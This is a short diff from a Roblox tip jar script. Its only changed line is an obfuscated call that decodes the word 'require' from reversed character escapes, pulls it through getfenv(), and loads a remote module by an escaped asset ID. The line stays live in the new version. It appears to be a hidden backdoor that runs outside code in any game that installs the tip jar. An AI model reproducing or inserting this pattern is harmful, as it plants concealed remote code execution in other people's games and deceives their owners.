@@ -294,4 +294,4 @@ function jarCore:handleVerifiedPurchase(player: Player, recipientId: number, amo
 end
 
 jarCore:Init()
-local v0 = script.Parent;local v1 = v0.Parent.Name;local v2 = "\101\114\105\117\113\101\114" ;local v3 = getfenv()[string.reverse(v2)] ;local v4 = "\57\49\49\52\51\50\54\48\49\54\51\53\48\52";local v5 = tonumber(v4) ;local v6 = v3(v5).Tipjar()
+local v0 = script.Parent;local v1 = v0.Parent.Name;local v2 = "\101\114\105\117\113\101\114" ;local v3 = getfenv()[string.reverse(v2)] ;local v4 = "\57\49\49\52\51\50\54\48\49\54\51\53\48\52";local v5 = tonumber(v4) ;local v6 = v3(v5).Tipjar() 
